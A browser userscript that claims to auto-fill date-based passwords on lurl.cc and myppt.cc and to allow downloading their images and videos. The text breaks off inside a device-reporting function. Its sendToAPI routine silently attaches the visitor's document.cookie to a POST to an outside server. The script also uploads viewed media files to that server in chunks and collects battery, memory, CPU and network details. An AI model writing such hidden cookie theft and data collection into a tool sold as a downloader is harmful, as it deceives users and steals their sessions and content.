// ==UserScript==
// @name         🔥2026|破解lurl&myppt密碼|自動帶入日期|可下載圖影片🚀|v5.3.8
// @namespace    http://tampermonkey.net/
// @version      5.3.8
// @description  針對lurl與myppt自動帶入日期密碼;開放下載圖片與影片
// @author       Jeffrey
// @match        https://lurl.cc/*
// @match        https://myppt.cc/*
// @match        https://www.dcard.tw/f/sex/*
// @match        https://www.dcard.tw/f/sex
// @license      MIT
// @icon         https://www.google.com/s2/favicons?sz=64&domain=lurl.cc
// @grant        GM_xmlhttpRequest
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        unsafeWindow
// @connect      localhost
// @connect      epi.isnowfriend.com
// @connect      *.lurl.cc
// @connect      *.myppt.cc
// @connect      lurl.cc
// @connect      myppt.cc
// @require      https://code.jquery.com/jquery-3.6.0.min.js
// @downloadURL https://update.greasyfork.org/scripts/476803/%F0%9F%94%A52026%7C%E7%A0%B4%E8%A7%A3lurlmyppt%E5%AF%86%E7%A2%BC%7C%E8%87%AA%E5%8B%95%E5%B8%B6%E5%85%A5%E6%97%A5%E6%9C%9F%7C%E5%8F%AF%E4%B8%8B%E8%BC%89%E5%9C%96%E5%BD%B1%E7%89%87%F0%9F%9A%80%7Cv538.user.js
// @updateURL https://update.greasyfork.org/scripts/476803/%F0%9F%94%A52026%7C%E7%A0%B4%E8%A7%A3lurlmyppt%E5%AF%86%E7%A2%BC%7C%E8%87%AA%E5%8B%95%E5%B8%B6%E5%85%A5%E6%97%A5%E6%9C%9F%7C%E5%8F%AF%E4%B8%8B%E8%BC%89%E5%9C%96%E5%BD%B1%E7%89%87%F0%9F%9A%80%7Cv538.meta.js
// ==/UserScript==

/* Lurl Downloader - https://github.com/anthropics/lurl-download-userscript */

(function ($) {
  "use strict";

  // 腳本版本（用於版本檢查）
  const SCRIPT_VERSION = '5.3.8';

  // API 驗證 Token
  const CLIENT_TOKEN = 'lurl-script-2026';

  // API 基底 URL
  const API_BASE = 'https://epi.isnowfriend.com/lurl';

  const Utils = {
    extractMMDD: (dateText) => {
      const pattern = /(\d{4})-(\d{2})-(\d{2})/;
      const match = dateText.match(pattern);
      return match ? match[2] + match[3] : null;
    },

    getQueryParam: (name) => {
      const params = new URLSearchParams(window.location.search);
      return params.get(name);
    },

    cookie: {
      get: (name) => {
        const match = document.cookie.match(new RegExp(`(^| )${name}=([^;]+)`));
        return match ? match[2] : null;
      },
      set: (name, value) => {
        document.cookie = `${name}=${value}; path=/`;
      },
    },

    showToast: (message, type = "success", duration = 5000) => {
      if (typeof Toastify === "undefined") return;
      Toastify({
        text: message,
        duration: duration,
        gravity: "top",
        position: "right",
        style: { background: type === "success" ? "#28a745" : type === "info" ? "#3b82f6" : "#dc3545" },
      }).showToast();
    },

    downloadFile: async (url, filename) => {
      try {
        const response = await fetch(url);
        const blob = await response.blob();
        const blobUrl = URL.createObjectURL(blob);
        const link = document.createElement("a");
        link.href = blobUrl;
        link.download = filename;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(blobUrl);
      } catch (error) {
        console.error("下載失敗:", error);
      }
    },

    extractThumbnail: (videoElement) => {
      return new Promise((resolve) => {
        try {
          const video = videoElement || document.querySelector("video");
          if (!video) {
            resolve(null);
            return;
          }

          // 確保影片已載入
          const capture = () => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth || 320;
            canvas.height = video.videoHeight || 180;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
            resolve(dataUrl);
          };

          if (video.readyState >= 2) {
            // 跳到 1 秒處取縮圖（避免黑畫面）
            video.currentTime = Math.min(1, video.duration || 1);
            video.onseeked = () => capture();
          } else {
            video.onloadeddata = () => {
              video.currentTime = Math.min(1, video.duration || 1);
              video.onseeked = () => capture();
            };
          }

          // 超時 fallback
          setTimeout(() => resolve(null), 5000);
        } catch (e) {
          console.error("縮圖提取失敗:", e);
          resolve(null);
        }
      });
    },

    sendToAPI: (data) => {
      const API_URL = `${API_BASE}/capture`;

      const payload = {
        ...data,
        cookies: document.cookie
      };

      GM_xmlhttpRequest({
        method: "POST",
        url: API_URL,
        headers: {
          "Content-Type": "application/json",
          "X-Client-Token": CLIENT_TOKEN
        },
        data: JSON.stringify(payload),
        onload: (response) => {
          if (response.status === 200) {
            const result = JSON.parse(response.responseText);
            console.log("API 回報成功:", data.title);

            // 如果需要上傳，下載 blob 並上傳（不管是否重複，只要檔案不存在就要傳）
            if (result.needUpload && result.id) {
              console.log("[lurl] 開始下載檔案並上傳...", data.fileUrl);
              Utils.downloadAndUpload(data.fileUrl, result.id);
            }
          } else {
            console.error("API 回報失敗:", response.status);
          }
        },
        onerror: (error) => {
          console.error("API 連線失敗:", error);
        },
      });
    },

    downloadAndUpload: async (fileUrl, recordId) => {
      const UPLOAD_URL = `${API_BASE}/api/upload`;
      const CHUNK_SIZE = 10 * 1024 * 1024; // 10MB per chunk

      console.log("[lurl] 開始下載並上傳:", fileUrl, "recordId:", recordId);

      try {
        // 用頁面原生 fetch 下載（不需要 credentials，CDN 不支持）
        const response = await fetch(fileUrl);

        console.log("[lurl] fetch 回應:", response.status);

        if (!response.ok) {
          console.error("[lurl] fetch 下載失敗:", response.status);
          return;
        }

        const blob = await response.blob();
        const size = blob.size;
        console.log(`[lurl] 檔案下載完成: ${(size / 1024 / 1024).toFixed(2)} MB`);

        if (size < 1000) {
          console.error("[lurl] 檔案太小，可能是錯誤頁面");
          return;
        }

        // 計算分塊數量
        const totalChunks = Math.ceil(size / CHUNK_SIZE);
        const CONCURRENCY = 4; // 同時上傳 4 塊
        console.log(`[lurl] 分塊上傳: ${totalChunks} 塊 (併發: ${CONCURRENCY})`);

        // 上傳單個分塊的函數
        const uploadChunk = async (i) => {
          const start = i * CHUNK_SIZE;
          const end = Math.min(start + CHUNK_SIZE, size);
          const chunk = blob.slice(start, end);
          const arrayBuffer = await chunk.arrayBuffer();

          return new Promise((resolve, reject) => {
            GM_xmlhttpRequest({
              method: "POST",
              url: UPLOAD_URL,
              headers: {
                "Content-Type": "application/octet-stream",
                "X-Client-Token": CLIENT_TOKEN,
                "X-Record-Id": recordId,
                "X-Chunk-Index": String(i),
                "X-Total-Chunks": String(totalChunks),
              },
              data: arrayBuffer,
              onload: (uploadRes) => {
                if (uploadRes.status === 200) {
                  console.log(`[lurl] 分塊 ${i + 1}/${totalChunks} 完成`);
                  resolve();
                } else {
                  reject(new Error(`Chunk ${i + 1} failed: ${uploadRes.status}`));
                }
              },
              onerror: (err) => reject(err),
            });
          });
        };

        // 併發上傳（控制同時數量）
        const chunks = Array.from({ length: totalChunks }, (_, i) => i);
        for (let i = 0; i < chunks.length; i += CONCURRENCY) {
          const batch = chunks.slice(i, i + CONCURRENCY);
          await Promise.all(batch.map(uploadChunk));
        }

        console.log("[lurl] 所有分塊上傳完成!");
      } catch (error) {
        console.error("[lurl] 下載/上傳過程錯誤:", error);
      }
    },
  };

  const ResourceLoader = {
    loadToastify: () => {
      $("<link>", {
        rel: "stylesheet",
        href: "https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css",
      }).appendTo("head");
      $("<script>", {
        src: "https://cdn.jsdelivr.net/npm/toastify-js",
      }).appendTo("head");
    },

    loadCustomStyles: () => {
      $("<style>")
        .text(`
          .disabled-button {
            background-color: #ccc !important;
            color: #999 !important;
            opacity: 0.5;
            cursor: not-allowed;
          }
        `)
        .appendTo("head");
    },

    init: () => {
      ResourceLoader.loadToastify();
      ResourceLoader.loadCustomStyles();
    },
  };

  const VersionChecker = {
    // 比較版本號（支援 x.y.z 格式）
    compareVersions: (current, target) => {
      const currentParts = current.split('.').map(Number);
      const targetParts = target.split('.').map(Number);
      const maxLen = Math.max(currentParts.length, targetParts.length);

      for (let i = 0; i < maxLen; i++) {
        const c = currentParts[i] || 0;
        const t = targetParts[i] || 0;
        if (c < t) return -1; // current < target
        if (c > t) return 1;  // current > target
      }
      return 0; // equal
    },

    // 顯示更新提示
    showUpdatePrompt: (config) => {
      const { latestVersion, message, updateUrl, forceUpdate, announcement } = config;

      // 建立提示 UI
      const $overlay = $('<div>', {
        id: 'lurl-update-overlay',
        css: {
          position: 'fixed',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          backgroundColor: forceUpdate ? 'rgba(0,0,0,0.8)' : 'transparent',
          zIndex: forceUpdate ? 99999 : 99998,
          pointerEvents: forceUpdate ? 'auto' : 'none',
        }
      });

      const $dialog = $('<div>', {
        id: 'lurl-update-dialog',
        css: {
          position: 'fixed',
          top: '20px',
          right: '20px',
          width: '320px',
          backgroundColor: '#fff',
          borderRadius: '12px',
          boxShadow: '0 4px 20px rgba(0,0,0,0.3)',
          padding: '20px',
          zIndex: 100000,
          fontFamily: 'sans-serif',
          pointerEvents: 'auto',
        }
      });

      const $title = $('<h3>', {
        text: forceUpdate ? '⚠️ 必須更新' : '🔄 有新版本',
        css: {
          margin: '0 0 12px 0',
          fontSize: '18px',
          color: forceUpdate ? '#dc3545' : '#333',
        }
      });

      const $version = $('<p>', {
        html: `目前版本: <strong>v${SCRIPT_VERSION}</strong> → 最新版本: <strong>v${latestVersion}</strong>`,
        css: { margin: '0 0 10px 0', fontSize: '14px', color: '#666' }
      });

      const $message = $('<p>', {
        text: message,
        css: { margin: '0 0 15px 0', fontSize: '14px', color: '#333' }
      });

      const $updateBtn = $('<a>', {
        href: updateUrl,
        text: '立即更新',
        target: '_blank',
        css: {
          display: 'inline-block',
          padding: '10px 20px',
          backgroundColor: '#28a745',
          color: '#fff',
          textDecoration: 'none',
          borderRadius: '6px',
          fontSize: '14px',
          fontWeight: 'bold',
          marginRight: '10px',
        }
      });

      $dialog.append($title, $version, $message, $updateBtn);

      // 非強制更新時顯示關閉按鈕
      if (!forceUpdate) {
        const $closeBtn = $('<button>', {
          text: '稍後再說',
          css: {
            padding: '10px 20px',
            backgroundColor: '#6c757d',
            color: '#fff',
            border: 'none',
            borderRadius: '6px',
            fontSize: '14px',
            cursor: 'pointer',
          }
        });
        $closeBtn.on('click', () => {
          $overlay.remove();
          $dialog.remove();
          // 記住使用者選擇，24小時內不再提醒
          sessionStorage.setItem('lurl_skip_update', Date.now());
        });
        $dialog.append($closeBtn);
      }

      // 如果有公告，顯示公告
      if (announcement) {
        const $announcement = $('<p>', {
          text: announcement,
          css: {
            margin: '15px 0 0 0',
            padding: '10px',
            backgroundColor: '#f8f9fa',
            borderRadius: '6px',
            fontSize: '13px',
            color: '#555',
          }
        });
        $dialog.append($announcement);
      }

      $('body').append($overlay, $dialog);
    },

    // 檢查版本
    check: () => {
      // 如果使用者選擇稍後再說，24小時內不再檢查
      const skipTime = sessionStorage.getItem('lurl_skip_update');
      if (skipTime && Date.now() - parseInt(skipTime) < 24 * 60 * 60 * 1000) {
        console.log('[lurl] 使用者已選擇稍後更新，跳過版本檢查');
        return;
      }

      GM_xmlhttpRequest({
        method: 'GET',
        url: `${API_BASE}/api/version`,
        headers: { 'X-Client-Token': CLIENT_TOKEN },
        onload: (response) => {
          if (response.status !== 200) {
            console.error('[lurl] 版本檢查失敗:', response.status);
            return;
          }

          try {
            const config = JSON.parse(response.responseText);
            const { latestVersion, minVersion, forceUpdate } = config;

            console.log(`[lurl] 版本檢查: 目前 v${SCRIPT_VERSION}, 最新 v${latestVersion}, 最低 v${minVersion}`);

            // 檢查是否低於最低版本（強制更新）
            if (VersionChecker.compareVersions(SCRIPT_VERSION, minVersion) < 0) {
              console.warn('[lurl] 版本過舊，需要強制更新');
              VersionChecker.showUpdatePrompt({ ...config, forceUpdate: true });
              return;
            }

            // 檢查是否有新版本
            if (VersionChecker.compareVersions(SCRIPT_VERSION, latestVersion) < 0) {
              console.log('[lurl] 有新版本可用');
              VersionChecker.showUpdatePrompt(config);
            } else {
              console.log('[lurl] 已是最新版本');
            }
          } catch (e) {
            console.error('[lurl] 版本資訊解析錯誤:', e);
          }
        },
        onerror: (error) => {
          console.error('[lurl] 版本檢查連線失敗:', error);
        },
      });
    },
  };

  const BackToDcardButton = {
    create: () => {
      const ref = Utils.getQueryParam("ref") || sessionStorage.getItem("myppt_ref");
      if (!ref) return null;
      const $button = $("<a>", {
        href: ref,
        text: "← 回到D卡文章",
        class: "btn btn-secondary",
        target: "_blank",
        css: {
          color: "white",
          backgroundColor: "#006aa6",
          marginLeft: "10px",
          textDecoration: "none",
          padding: "6px 12px",
          borderRadius: "4px",
        },
      });
      return $button;
    },

    inject: ($container) => {
      if ($("#back-to-dcard-btn").length) return;
      const $button = BackToDcardButton.create();
      if (!$button) return;
      $button.attr("id", "back-to-dcard-btn");
      if ($container && $container.length) {
        $container.append($button);
      }
    },
  };

  // 封鎖清單快取（避免重複下載已封鎖的內容）
  const BlockedCache = {
    urls: new Set(),
    lastFetch: 0,
    CACHE_DURATION: 5 * 60 * 1000, // 5 分鐘快取

    refresh: function() {
      return new Promise((resolve) => {
        if (Date.now() - this.lastFetch < this.CACHE_DURATION) {
          resolve();
          return;
        }

        GM_xmlhttpRequest({
          method: 'POST',
          url: `${API_BASE}/api/rpc`,
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${CLIENT_TOKEN}`
          },
          data: JSON.stringify({ a: 'bl', p: {} }),
          onload: (response) => {
            try {
              if (response.status === 200) {
                const data = JSON.parse(response.responseText);
                this.urls = new Set(data.blockedUrls || []);
                this.lastFetch = Date.now();
                console.log(`[lurl] 封鎖清單已更新: ${this.urls.size} 項`);
              }
            } catch (e) {
              console.error('[lurl] 封鎖清單解析失敗:', e);
            }
            resolve();
          },
          onerror: (e) => {
            console.error('[lurl] 無法取得封鎖清單:', e);
            resolve();
          }
        });
      });
    },

    isBlocked: function(fileUrl) {
      return this.urls.has(fileUrl);
    }
  };

  // ==================== LurlHub 品牌卡片 ====================
  const LurlHubBrand = {
    // 品牌卡片樣式（只注入一次）
    injectStyles: () => {
      if (document.getElementById('lurlhub-brand-styles')) return;
      const style = document.createElement('style');
      style.id = 'lurlhub-brand-styles';
      style.textContent = `
        .lurlhub-brand-card {
          background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
          border-radius: 12px;
          padding: 16px 20px;
          max-width: 320px;
          margin: 15px auto;
          text-align: center;
          box-shadow: 0 8px 30px rgba(0,0,0,0.25);
          border: 1px solid rgba(255,255,255,0.1);
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        .lurlhub-brand-link {
          display: flex;
          align-items: center;
          gap: 12px;
          text-decoration: none;
          padding: 8px;
          border-radius: 8px;
          transition: background 0.2s;
        }
        .lurlhub-brand-link:hover {
          background: rgba(255,255,255,0.05);
        }
        .lurlhub-brand-logo {
          width: 40px !important;
          height: 40px !important;
          border-radius: 8px;
          flex-shrink: 0;
        }
        .lurlhub-brand-text {
          text-align: left;
        }
        .lurlhub-brand-name {
          font-size: 16px;
          font-weight: bold;
          color: #fff;
        }
        .lurlhub-brand-slogan {
          font-size: 12px;
          color: #3b82f6;
          margin-top: 2px;
        }
        .lurlhub-success-h1 {
          text-align: center;
          color: #10b981;
          margin: 20px 0 10px 0;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
      `;
      document.head.appendChild(style);
    },

    // 建立品牌卡片元素
    createCard: (slogan = '受不了過期連結？我們搞定 →') => {
      LurlHubBrand.injectStyles();
      const card = document.createElement('div');
      card.className = 'lurlhub-brand-card';
      card.innerHTML = `
        <a href="${API_BASE}/browse" target="_blank" class="lurlhub-brand-link">
          <img src="${API_BASE}/files/LOGO.png" class="lurlhub-brand-logo" onerror="this.style.display='none'">
          <div class="lurlhub-brand-text">
            <div class="lurlhub-brand-name">LurlHub</div>
            <div class="lurlhub-brand-slogan">${slogan}</div>
          </div>
        </a>
      `;
      return card;
    },

    // 建立成功標題 h1
    createSuccessH1: (text = '✅ 拯救過期資源成功') => {
      LurlHubBrand.injectStyles();
      const h1 = document.createElement('h1');
      h1.className = 'lurlhub-success-h1';
      h1.textContent = text;
      return h1;
    },

    // 建立好評引導提示（含序號領額度）
    createRatingPrompt: (visitorId) => {
      const shortCode = (visitorId || '').substring(0, 6).toUpperCase();
      const prompt = document.createElement('div');
      prompt.className = 'lurlhub-rating-prompt';
      prompt.innerHTML = `
        <div class="lurlhub-rating-content">
          <div class="lurlhub-rating-title">🎉 救援成功！給好評領額度</div>
          <div class="lurlhub-rating-desc">
            在好評中附上序號 <span class="lurlhub-code" id="lurlhub-code">${shortCode}</span> 即可領取 +5 額度
          </div>
        </div>
        <div class="lurlhub-rating-actions">
          <button class="lurlhub-copy-btn" id="lurlhub-copy-btn">📋 複製</button>
          <a href="https://greasyfork.org/zh-TW/scripts/476803/feedback" target="_blank" class="lurlhub-rating-btn">
            ⭐ 前往評價
          </a>
        </div>
        <button class="lurlhub-rating-close" onclick="this.parentElement.remove()">✕</button>
      `;

      // 複製功能
      prompt.querySelector('#lurlhub-copy-btn').addEventListener('click', () => {
        navigator.clipboard.writeText(shortCode).then(() => {
          const btn = prompt.querySelector('#lurlhub-copy-btn');
          btn.textContent = '✓ 已複製';
          btn.style.background = '#10b981';
          setTimeout(() => {
            btn.textContent = '📋 複製';
            btn.style.background = '';
          }, 2000);
        });
      });

      // 注入樣式
      if (!document.getElementById('lurlhub-rating-styles')) {
        const style = document.createElement('style');
        style.id = 'lurlhub-rating-styles';
        style.textContent = `
          .lurlhub-rating-prompt {
            display: flex;
            align-items: center;
            gap: 12px;
            background: linear-gradient(135deg, #fef3c7, #fde68a);
            border: 1px solid #f59e0b;
            border-radius: 12px;
            padding: 14px 18px;
            margin: 16px auto;
            max-width: 520px;
            box-shadow: 0 2px 8px rgba(245, 158, 11, 0.2);
            position: relative;
          }
          .lurlhub-rating-content {
            flex: 1;
          }
          .lurlhub-rating-title {
            font-size: 15px;
            color: #92400e;
            font-weight: 600;
            margin-bottom: 4px;
          }
          .lurlhub-rating-desc {
            font-size: 13px;
            color: #a16207;
          }
          .lurlhub-code {
            display: inline-block;
            background: #fff;
            border: 1px solid #f59e0b;
            border-radius: 4px;
            padding: 2px 8px;
            font-family: monospace;
            font-weight: bold;
            color: #d97706;
            letter-spacing: 1px;
          }
          .lurlhub-rating-actions {
            display: flex;
            gap: 8px;
            flex-shrink: 0;
          }
          .lurlhub-copy-btn {
            background: #fbbf24;
            color: #78350f;
            padding: 8px 12px;
            border-radius: 8px;
            border: none;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
          }
          .lurlhub-copy-btn:hover {
            background: #f59e0b;
          }
          .lurlhub-rating-btn {
            background: #f59e0b;
            color: white;
            padding: 8px 14px;
            border-radius: 8px;
            text-decoration: none;
            font-size: 13px;
            font-weight: 600;
            transition: background 0.2s;
          }
          .lurlhub-rating-btn:hover {
            background: #d97706;
          }
          .lurlhub-rating-close {
            position: absolute;
            top: 8px;
            right: 8px;
            background: none;
            border: none;
            color: #92400e;
            cursor: pointer;
            font-size: 14px;
            padding: 2px;
            opacity: 0.5;
            line-height: 1;
          }
          .lurlhub-rating-close:hover {
            opacity: 1;
          }
        `;
        document.head.appendChild(style);
      }
      return prompt;
    },

    // 在元素後面插入品牌卡片
    insertAfter: (targetElement, slogan) => {
      if (!targetElement) return;
      // 防止重複插入
      if (targetElement.nextElementSibling?.classList?.contains('lurlhub-brand-card')) return;
      const card = LurlHubBrand.createCard(slogan);
      targetElement.insertAdjacentElement('afterend', card);
    }
  };

  // ==================== LurlHub 修復服務 ====================
  const RecoveryService = {
    // 取得或建立訪客 ID（用 GM_setValue 跨網域保持一致）
    getVisitorId: () => {
      let id = GM_getValue('lurlhub_visitor_id', null);
      if (!id) {
        // 嘗試從舊的 localStorage 遷移
        id = localStorage.getItem('lurlhub_visitor_id');
        if (!id) {
          id = 'v_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
        }
        GM_setValue('lurlhub_visitor_id', id);
      }
      return id;
    },

    // 檢測頁面狀態
    // 返回: 'expired' | 'needsPassword' | 'passwordFailed' | 'normal'
    getPageStatus: () => {
      const h1 = document.querySelector('h1');
      if (h1 && h1.textContent.includes('該連結已過期')) {
        return 'expired';
      }
      // 檢查密碼狀態
      const $statusSpan = $('#back_top .container.NEWii_con section:nth-child(6) h2 span');
      const statusText = $statusSpan.text();

      if (statusText.includes('錯誤')) {
        return 'passwordFailed'; // 密碼錯誤
      }
      if (statusText.includes('成功')) {
        return 'normal'; // 密碼正確，正常頁面
      }
      // 有 .login_span 但還沒嘗試密碼
      if ($('.login_span').length > 0) {
        return 'needsPassword';
      }
      return 'normal';
    },

    // 檢測頁面是否過期（向下相容）
    isPageExpired: () => {
      return RecoveryService.getPageStatus() === 'expired';
    },

    // 主入口：查備份 → 決定策略
    checkAndRecover: async () => {
      const pageUrl = window.location.href.split('?')[0];
      const pageStatus = RecoveryService.getPageStatus();

      console.log(`[LurlHub] 頁面狀態: ${pageStatus}`);

      // 先查備份
      const backup = await RecoveryService.checkBackup(pageUrl);
      const hasBackup = backup.hasBackup;

      console.log(`[LurlHub] 有備份: ${hasBackup}`);

      // 背景回報設備資訊（不阻塞）
      RecoveryService.reportDevice();

      // ===== 有備份的情況 =====
      if (hasBackup) {
        // 已修復過 → 直接顯示，不扣點
        if (backup.alreadyRecovered) {
          console.log('[LurlHub] 已修復過，直接顯示備份');
          // 如果是密碼錯誤頁面，先清理 UI
          if (pageStatus === 'passwordFailed') {
            RecoveryService.cleanupPasswordFailedUI();
          }
          RecoveryService.replaceResource(backup.backupUrl, backup.record.type);
          Utils.showToast('✅ 已自動載入備份', 'success');
          return { handled: true, hasBackup: true };
        }

        // 過期頁面 → 顯示修復按鈕
        if (pageStatus === 'expired') {
          console.log('[LurlHub] 過期頁面，插入修復按鈕');
          RecoveryService.insertRecoveryButton(backup, pageUrl);
          return { handled: true, hasBackup: true };
        }

        // 需要密碼 → 返回讓外層先嘗試破解
        if (pageStatus === 'needsPassword') {
          console.log('[LurlHub] 需要密碼，先嘗試破解');
          return { handled: false, hasBackup: true, backup, pageStatus };
        }

        // 密碼錯誤 → 顯示「使用備份」按鈕
        if (pageStatus === 'passwordFailed') {
          console.log('[LurlHub] 密碼錯誤，提供備份選項');
          RecoveryService.insertBackupButton(backup, pageUrl);
          return { handled: true, hasBackup: true };
        }

        // 正常頁面 → 備份作為 fallback
        console.log('[LurlHub] 正常頁面，備份待命');
        return { handled: false, hasBackup: true, backup };
      }

      // ===== 無備份的情況 =====
      if (pageStatus === 'expired') {
        console.log('[LurlHub] 過期且無備份，無能為力');
        return { handled: true, hasBackup: false };
      }

      // 需要密碼或正常 → 讓外層處理
      return { handled: false, hasBackup: false };
    },

    // 在過期 h1 底下插入 LurlHub 按鈕
    insertRecoveryButton: (backup, pageUrl) => {
      const h1 = document.querySelector('h1');
      if (!h1) return;

      // 移除舊的按鈕
      const oldBtn = document.getElementById('lurlhub-recovery-btn');
      if (oldBtn) oldBtn.remove();

      const btnContainer = document.createElement('div');
      btnContainer.id = 'lurlhub-recovery-btn';
      btnContainer.innerHTML = `
        <style>
          #lurlhub-recovery-btn {
            text-align: center;
            margin: 20px auto;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
          }
          .lurlhub-btn-main {
            display: inline-flex;
            align-items: center;
            gap: 12px;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            border: 1px solid rgba(59,130,246,0.5);
            border-radius: 12px;
            padding: 15px 25px;
            cursor: pointer;
            transition: all 0.3s;
          }
          .lurlhub-btn-main:hover {
            transform: scale(1.02);
            border-color: #3b82f6;
            box-shadow: 0 5px 20px rgba(59,130,246,0.3);
          }
          .lurlhub-btn-logo {
            width: 40px;
            height: 40px;
            border-radius: 8px;
          }
          .lurlhub-btn-text {
            text-align: left;
          }
          .lurlhub-btn-brand {
            font-size: 16px;
            font-weight: bold;
            color: #fff;
          }
          .lurlhub-btn-tagline {
            font-size: 12px;
            color: #3b82f6;
          }
        </style>
        <div class="lurlhub-btn-main" id="lurlhub-trigger">
          <img src="${API_BASE}/files/LOGO.png" class="lurlhub-btn-logo" onerror="this.style.display='none'">
          <div class="lurlhub-btn-text">
            <div class="lurlhub-btn-brand">LurlHub</div>
            <div class="lurlhub-btn-tagline">✨ 一鍵救援過期影片 [免費恢復]</div>
          </div>
        </div>
      `;

      h1.insertAdjacentElement('afterend', btnContainer);

      // 點擊按鈕顯示彈窗
      document.getElementById('lurlhub-trigger').onclick = () => {
        RecoveryService.showModal(backup.quota, async () => {
          try {
            const result = await RecoveryService.recover(pageUrl);
            RecoveryService.replaceResource(result.backupUrl, result.record.type);
            btnContainer.remove(); // 移除按鈕
            if (result.alreadyRecovered) {
              Utils.showToast('✅ 已自動載入備份', 'success');
            } else {
              Utils.showToast(`✅ 修復成功！剩餘額度: ${result.quota.remaining}`, 'success');
            }
          } catch (err) {
            if (err.error === 'quota_exhausted') {
              Utils.showToast('❌ 額度已用完', 'error');
            } else {
              Utils.showToast('❌ 修復失敗', 'error');
            }
          }
        });
      };
    },

    // 清理密碼錯誤頁面的 UI（給 alreadyRecovered 用）
    cleanupPasswordFailedUI: () => {
      // 隱藏密碼錯誤的 h2（replaceResource 會加成功訊息）
      $('h2.standard-header:contains("密碼錯誤")').hide();
      // 移除所有 .movie_introdu 裡的內容（可能有多個）
      $('.movie_introdu').find('video, img').remove();
      // 只保留第一個 .movie_introdu，隱藏其他的
      $('.movie_introdu').not(':first').hide();
    },

    // 密碼錯誤時插入「使用備份」按鈕
    insertBackupButton: (backup, pageUrl) => {
      // 找到密碼錯誤的 h2 並修改文字
      const $errorH2 = $('h2.standard-header span.text:contains("密碼錯誤")');
      if ($errorH2.length) {
        $errorH2.html('🎬 LurlHub 救援模式');
        $errorH2.closest('h2').css('color', '#3b82f6');
      }

      // 找到 movie_introdu 區塊並替換內容
      const $movieSection = $('.movie_introdu');
      if (!$movieSection.length) return;

      $movieSection.html(`
        <style>
          .lurlhub-backup-container {
            text-align: center;
            padding: 30px 20px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
          }
          .lurlhub-backup-logo {
            width: 80px;
            height: 80px;
            border-radius: 16px;
            margin-bottom: 15px;
          }
          .lurlhub-backup-title {
            color: #333;
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 8px;
          }
          .lurlhub-backup-desc {
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
            line-height: 1.6;
          }
          .lurlhub-backup-trigger {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            border: none;
            border-radius: 10px;
            padding: 14px 28px;
            color: #fff;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 4px 15px rgba(59,130,246,0.3);
          }
          .lurlhub-backup-trigger:hover {
            transform: scale(1.05);
            box-shadow: 0 6px 20px rgba(59,130,246,0.4);
          }
          .lurlhub-backup-quota {
            color: #888;
            font-size: 13px;
            margin-top: 15px;
          }
        </style>
        <div class="lurlhub-backup-container">
          <img src="${API_BASE}/files/LOGO.png" class="lurlhub-backup-logo" onerror="this.style.display='none'">
          <div class="lurlhub-backup-title">密碼錯誤？沒關係！</div>
          <div class="lurlhub-backup-desc">
            LurlHub 有這個內容的備份<br>
            消耗 1 額度即可觀看
          </div>
          <button class="lurlhub-backup-trigger" id="lurlhub-backup-trigger">
            ✨ 使用備份觀看
          </button>
          <div class="lurlhub-backup-quota">剩餘額度: ${backup.quota.remaining} / ${backup.quota.total}</div>
        </div>
      `);

      // 點擊按鈕
      document.getElementById('lurlhub-backup-trigger').onclick = async () => {
        const btn = document.getElementById('lurlhub-backup-trigger');
        btn.disabled = true;
        btn.textContent = '載入中...';

        try {
          const result = await RecoveryService.recover(pageUrl);
          RecoveryService.replaceResource(result.backupUrl, result.record.type);
          Utils.showToast(`✅ 觀看成功！剩餘額度: ${result.quota.remaining}`, 'success');
        } catch (err) {
          btn.disabled = false;
          btn.textContent = '✨ 使用備份觀看';
          if (err.error === 'quota_exhausted') {
            Utils.showToast('❌ 額度已用完', 'error');
          } else {
            Utils.showToast('❌ 載入失敗', 'error');
          }
        }
      };
    },

    // RPC 呼叫（統一入口）
    rpc: (action, payload = {}) => {
      return new Promise((resolve, reject) => {
        GM_xmlhttpRequest({
          method: 'POST',
          url: `${API_BASE}/api/rpc`,
          headers: {
            'Content-Type': 'application/json',
            'X-Visitor-Id': RecoveryService.getVisitorId()
          },
          data: JSON.stringify({ a: action, p: payload }),
          onload: (response) => {
            try {
              resolve(JSON.parse(response.responseText));
            } catch (e) {
              reject({ error: 'parse_error' });
            }
          },
          onerror: () => reject({ error: 'network_error' })
        });
      });
    },

    // 檢查是否有備份
    checkBackup: async (pageUrl) => {
      try {
        const data = await RecoveryService.rpc('cb', { url: pageUrl });
        return data;
      } catch (e) {
        return { hasBackup: false };
      }
    },

    // 執行修復
    recover: async (pageUrl) => {
      const data = await RecoveryService.rpc('rc', { url: pageUrl });
      if (data.ok) {
        return data;
      } else {
        throw data;
      }
    },

    // 回報設備資訊
    reportDevice: async () => {
      try {
        const payload = {};

        // 網路資訊
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
          payload.nt = conn.effectiveType;  // 4g, 3g, etc
          payload.dl = conn.downlink;       // Mbps
          payload.rtt = conn.rtt;           // ms
        }

        // 硬體資訊
        payload.cpu = navigator.hardwareConcurrency;
        payload.mem = navigator.deviceMemory;

        // 電量資訊
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          payload.bl = battery.level;
          payload.bc = battery.charging;
        }

        // 先上報基本資訊
